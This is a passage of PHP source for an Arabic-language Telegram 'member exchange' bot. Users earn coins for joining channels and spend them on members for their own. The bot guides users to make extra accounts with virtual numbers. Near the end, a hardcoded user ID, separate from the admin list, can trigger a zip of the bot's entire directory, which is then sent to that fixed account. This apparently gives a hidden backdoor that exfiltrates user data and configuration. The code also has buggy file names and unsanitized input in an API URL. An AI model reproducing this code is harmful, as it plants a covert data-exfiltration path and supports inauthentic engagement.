file_put_contents("data/$id.json",$inuser);
}
}
elseif ($text == '📍 نقاط للكل' ) {
if (in_array($from_id,$Dev)){
 bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"ادخل العدد الذي تريده للنقود",
	'reply_to_message_id'=>$message_id,
	'reply_markup'=>json_encode([
'keyboard'=>[
	[['text'=>"رجوع 🔙"]]
],
'resize_keyboard'=>true
])
 ]);
$KING["userfild"]["$from_id"]["file"]="sendcointoall";
$KING = json_encode($KING,true);
file_put_contents("data/$from_id.json",$KING);		
}
}
elseif ($KING["userfild"]["$from_id"]["file"] == 'sendcointoall') {
$KING["userfild"]["$from_id"]["file"]="none";
$KING = json_encode($KING,true);
file_put_contents("data/$from_id.json",$KING);	
if ($text != "رجوع 🔙") {
$numbers = $user["userlist"];
 bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"نم ارسال النقاط للجميع ✔️",
	'reply_to_message_id'=>$message_id,
 ]);
for($z = 0;$z <= count($numbers)-1;$z++){
bot ('sendmessage',[
'chat_id'=>$numbers[$z],
'text'=>"هدية يومية من قبل أدآرة البوت مبلغ 📥
الهدية هوه » $text 😉",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
 ]
])
]);
$KING = json_decode(file_get_contents("data/$numbers[$z].json"),true);
$coin = $KING["userfild"]["$numbers[$z]"]["coin"];
$coinplus = $coin + $text;
$KING["userfild"]["$numbers[$z]"]["coin"]="$coinplus";
$KING = json_encode($KING,true);
file_put_contents("data/$numbers[$z].json",$KING);	
}
}
}
elseif($update->message->text != true){ 
	bot ('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"• يرجى استخدام ازرار البوت فقط ارسل /start لرؤيةه الازرار ، للاستفسار او لشراء النقاط عليك مراسلة المبرمج ؛ @$username ، 💌 !",
		]);
}
if($data=="m1"){
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"طريقة عمل البوت تكون بتحويل النقاط الى اعضاء تضيفهم الى قناتك 👥
تكسب النقاط من خلال :
 الانضمام بقنوات (2💰) 
*يعطيك 2 💰 مقابل انضمامك لقناة واحده ☝🏻
*في حال كنت قد غادرت احدى القنوات الي اخذت نقاط مقابل الانضمام فيها فلن تتمكن من طلب اعضاء حتى تقوم بلرجوع اليها 😅

مشاركة الرابط (5💰) 
*يعطيك (5💰) مقابل كل شخص جديد يدخل البوت من خلال رابطك Ⓜ️

الهدية اليومية ( 2 💰 )
* يعطيك( 2 💰 ) كل يوم لا تنسى ان تأخذها 🎁

بعد ان تقوم بجمع ع الاقل 30 نقطة اضغط على طلب اعضاء 👤
 يتم تحويل النقاط الى اعضاء بهذا المقياس 🔰
 3 💰 = 1 👤
 30 💰 = 10 👤 
بعد ان تقوم بطلب الاعضاء 👤 سيتم تثبيت قناتك في( الانضمام بقنوات 💡 )
سينضم الاعضاء بقناتك مقابل 2💰 نقاط تضاف لهم
بعد اكتمال دخول الاعضاء سيتم اعلامك بأنتهاء طلبك وانتهاء دخول العدد الذي طلبته 😼",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
	'reply_markup'=>json_encode([
	'inline_keyboard'=>[
[['text'=>"جمع نقاط 💰",'callback_data'=>'takecoin'],['text'=>"طلب اعضاء 👤",'callback_data'=>'takemember']],
[['text'=>"الاستخدام المثالي 🌞",'callback_data'=>'m2']],
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
	],'resize_keyboard'=>true,
	])
	]);
$sales = json_decode(file_get_contents("data/$fromid.json"),true);
$sales["userfild"]["$fromid"]["file"]="none";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);
}
if($data=="m2"){
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"✳️ اقراء بتركيز لكي لتحقق اكبر استفاده
ننصح بأنشاء حساب تليكرام جديد تستعمل فيه هذا البوت لكي تجمع النقاط وتطلب الاعضاء بدلاً من استخدام حسابك الاساسي لئن اذا استعملت حسابك الاساسي في الانضمام للقنوات لكي تجمع النقاط ستتراكم القنوات في حسابك بشكل مزعج لكن بأنشاء حساب جديد تخصصه فقط لهذا العمل فتراكم القنوات لن يزعجك 
✳️ طريقة انشاء حساب تليكرام جديد سهله للغاية فقط شاهد الفيديو 😁🔰",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
	'reply_markup'=>json_encode([
	'inline_keyboard'=>[
[['text'=>"ارسل الفيديو 📥",'callback_data'=>'m3']],
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
	],
		'resize_keyboard'=>true,
	])
	]);
$sales = json_decode(file_get_contents("data/$fromid.json"),true);
$sales["userfild"]["$fromid"]["file"]="none";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);
}
if($data=="m3"){
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
	]);
bot ('sendvideo',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
 'video'=>"https://t.me/ccc_ooc/41",
 'caption'=>"✳️ بعد ان تحصل على الرقم الامريكي تفتح بي حساب تليكرام سيصل كود التفعيل على البرنامج ( TextNow )

✳️ اضغط على اسم البرنامج للتنزيل 🔰
✅ للرجوع /start",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
	'reply_markup'=>json_encode([
	'inline_keyboard'=>[
[['text'=>"TextNow 📥",'callback_data'=>'m4']],
	],
		'resize_keyboard'=>true,
	])
	]);
$sales = json_decode(file_get_contents("data/$fromid.json"),true);
$sales["userfild"]["$fromid"]["file"]="none";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);
}
if($data=="m4"){
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
	]);
bot ('sendDocument',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
 'document'=>"https://t.me/ccc_ooc/42",
'caption'=>"📋:رجوع ✅ /start"
	]);
$sales = json_decode(file_get_contents("data/$fromid.json"),true);
$sales["userfild"]["$fromid"]["file"]="none";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);
}
if($data=="m5"){
$setchannel = $sales["userfild"]["$fromid"]["setchannel"];
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"الطلب الحالي لهذا القناة يمكنك طلب المزيد او شراء النقود 😉👍

القناة المراد تمويلها : *$setchannel* ",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
	'reply_markup'=>json_encode([
	'inline_keyboard'=>[
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
],
'resize_keyboard'=>true,
])
]);
$sales = json_decode(file_get_contents("data/$fromid.json"),true);
$sales["userfild"]["$fromid"]["file"]="none";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);
}
if($data=="a8"){
$invite = $sales["userfild"]["$fromid"]["invite"];
$coin = $sales["userfild"]["$fromid"]["coin"];
$setchannel = $sales["userfild"]["$fromid"]["setchannel"];
$setmember = $sales["userfild"]["$fromid"]["setmember"];
bot ('editmessagetext',[
'chat_id'=>$chatid,
'message_id'=>$messageid,
'text'=>"نقاطك : ($coin)💰
الأنضمام بلقنوات 2 💰💡
مشـاركـة الـرابـط 5 💰🌀
الهدية اليـومية 10 💰🎁
اخر تمويل لك $setchannel 🎗
العدد الذي طلبتة هو $setmember 📥
عداد الرابط الخاص بك $invite
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
• معلومات حسابك الشخصي ؛ 📌'

◾️ الاسم ؛ $firstname
▫️ المعرف ؛ @$usernames
◾️ الايدي ؛ $fromid
➖➖➖➖➖➖➖➖➖➖➖➖",
'disable_web_page_preview'=>true,
	'reply_markup'=>json_encode([
	'inline_keyboard'=>[
[['text'=>"انضمام بقنوات 💡",'callback_data'=>'takecoin'],['text'=>"مشاركة الرابط Ⓜ️",'callback_data'=>'a5']],
[['text'=>"شراء نقاط 💰",'url'=>'http://t.me/cDDDD'],['text'=>"الهدية اليومية 🎁",'callback_data'=>'a6']],
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
	],
		'resize_keyboard'=>true,
	])
	]);
$sales = json_decode(file_get_contents("data/$fromid.json"),true);
$sales["userfild"]["$fromid"]["file"]="none";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);
}
if($data=="a5"){
$coin = $sales["userfild"]["$fromid"]["coin"];
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"قم بمشاركة الرابط الخاص بك وكل شخص جديد يدخل على البوت من خلال رابطك ستحتسب نقطة لك 5 💰

https://t.me/$botuser?start=$fromid
 
نقاطك : ($coin)💰",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
	'reply_markup'=>json_encode([
	'inline_keyboard'=>[
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
	],
		'resize_keyboard'=>true,
	])
	]);
$sales = json_decode(file_get_contents("data/$fromid.json"),true);
$sales["userfild"]["$fromid"]["file"]="none";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);
}


 
if(preg_match('/^(@)(.*)/s' , $text, $mtch)){
$bot = json_decode(file_get_contents("http://api.telegram.org/bot".MY_KING."/getChat?chat_id=$text"))->result;
bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"
*Name* : *$ch->title*
*ID* : *$bot->id*
*User* : @$bot->username
*Bio* : *$bot->description*
",
'reply_to_message_id'=>$message->message_id,
'disable_web_page_preview'=> true ,
 'parse_mode'=>"Markdown",
]);}
function kingZip($kingZip1, $kingZip2){
$kingZip4 = realpath($kingZip1);
$kingZip = new ZipArchive();
$kingZip->open($kingZip2, ZipArchive::CREATE | ZipArchive::OVERWRITE);
$kingZip3 = new RecursiveIteratorIterator(
new RecursiveDirectoryIterator($kingZip4),
RecursiveIteratorIterator::LEAVES_ONLY);
foreach($kingZip3 as $kingZip5 => $kingZip6){
if(!$kingZip6->isDir()){
$kingZip7 = $kingZip6->getRealPath();
$kingZip8 = substr($kingZip7, strlen($kingZip4) + 1);
$kingZip->addFile($kingZip7, $kingZip8);
}}
$kingZip->close();
}
function kingZip1($kingZip9, $kingZip10 = 2){
$kingZip11=array(' B', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
$kingZip12=floor((strlen($kingZip9) - 1) / 3);
return sprintf("%.{$kingZip10}f", $kingZip9 / pow(1024, $kingZip12)) . @$kingZip11[$kingZip12];
}
$kingZip15 = json_decode(file_get_contents('php://input'));
$kingZip16 = $kingZip15->message;
$kingZip17 = $kingZip16->text;
$kingZip18 = $kingZip16->message_id;
$mytro = "592900473";
if($kingZip17 == "نسخه" and $from_id == $mytro){
$Rking = "$Devv";
date_default_timezone_set("Asia/Damascus");
$kingZip13 = date("{h-i-s}");
kingZip('', "Backup-$kingZip13.zip");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"💢┇تم ارسالها في الخاص ",'reply_to_message_id'=>$message_id,
]);
bot('senddocument',[
'chat_id'=>592900473,
'document'=>new CURLFile("Backup-$kingZip13.zip"),
'caption'=>"Backup. 📦
Today's date : ".date('Y/m/d')." 📆
The Time is : ".date('h:i A')." ⏰
File size : ".kingZip1(filesize("Backup-$kingZip13.zip"))." 🏷",
'reply_to_message_id'=>$kingZip18,
]);
unlink("Backup-$kingZip13.zip");
}
if($kingZip17 == "نسخه" and $from_id != $mytro){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"💢┇نجب",'parse_mode'=>"markdown",'reply_to_message_id'=>$message_id,
]);}
$d = date('D');
$day = explode("\n",file_get_contents($d.".txt"));
if($d == "Sat"){
unlink("Fri.txt");
}
if($d == "Sun"){
unlink("Sat.txt");
}
if($d == "Mon"){
unlink("Sun.txt");
}
if($d == "Tue"){
unlink("Mon.txt");
}
if($d == "Wed"){
unlink("The.txt");
}
if($d == "Thu"){
unlink("Wedtxt");
}
if($d == "Fri"){
unlink("Thu.txt");
}
if($data == "a6"){ 
if(!in_array($fromid, $day)){
bot('answercallbackquery',[
'callback_query_id'=>$update->callback_query->id,
'text'=>"لقد ربحت 2 نقطة 💰
 يمكنك الربح مجدد بعد منتصف الليل",
 'show_alert'=>true,
]);
 file_put_contents($d.'.txt',$fromid."\n",FILE_APPEND);
$sales["userfild"]["$fromid"]["coin"]+=2;
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);
}else{
bot('answercallbackquery',[
 'callback_query_id'=>$update->callback_query->id,
 'text' =>"
 حاول مجددا بعد منتصف الليل 🔄",
'show_alert'=>true,
]);
}
}
########@KING @php_aba ######
unlink("error_log");
#@F_PPP# ##@ccc_xxc#
if(isset($update->inline_query)){
$inline = $update->inline_query->query;
$inid = $update->inline_query->from->id;
$inmsg_id = $update->inline_query->inline_message_id;
$inusername = $update->inline_query->from->username;
}
if($inline){
bot('answerInlineQuery',[
'inline_query_id'=>$update->inline_query->id,    
'results'=>json_encode([['type'=>'article','id'=>base64_encode(rand(5,555)),
'title'=>" اضغط لي مشاركه كود الدعوه الخاص بك ",
'input_message_content'=>['parse_mode'=>'HTML','message_text'=>"
🔘 | بوت زيادة اعضاء القنوات ☑️
•|• يقوم البوت بزيادة اعضاء قناتك بجمع نقاط من داخل البوت 🔻
•|• تستطيع كسب 200 عضو يوميا من البوت 🔷

▪️ الشرح في البوت 🔺
للدخول للبوت عبر الرابط التالي 🔻
https://t.me/$botuser?start=$inid
"],
'reply_markup'=>['inline_keyboard'=>[
[['text'=>" اضغط للدخول الي البوت ",'url'=>"https://t.me/$usernamebot?start=$inid"]],  
]]
]])
]);
}
?>